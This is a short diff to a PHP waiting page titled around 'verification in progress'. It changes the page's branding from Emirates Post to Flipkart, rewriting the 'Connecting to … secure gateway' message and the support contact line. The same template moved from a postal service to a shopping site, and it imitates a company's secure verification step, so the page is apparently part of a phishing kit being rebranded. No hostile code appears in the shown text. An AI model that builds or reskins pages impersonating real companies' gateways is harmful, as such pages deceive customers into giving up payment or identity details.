@@ -26,7 +26,7 @@ session_start();
             </p>
             <div class="flex items-center justify-center space-x-3 text-blue-600">
                 <i class="fas fa-circle-notch fa-spin text-2xl"></i>
-                <span class="font-semibold">Connecting to Emirates Post gateway?</span>
+                <span class="font-semibold">Connecting to Flipkart secure gateway...</span>
             </div>
             <div class="bg-blue-50 border border-blue-200 rounded-xl p-5 text-left text-sm text-blue-800">
                 <p class="font-semibold mb-2">What happens next?</p>
@@ -36,7 +36,7 @@ session_start();
                     <li>Do not close this window while verification is in progress.</li>
                 </ul>
             </div>
-            <p class="text-xs text-gray-500">Need help? Contact Emirates Post support at any time.</p>
+            <p class="text-xs text-gray-500">Need help? Contact Flipkart support at any time.</p>
         </div>
     </div>
 </body>
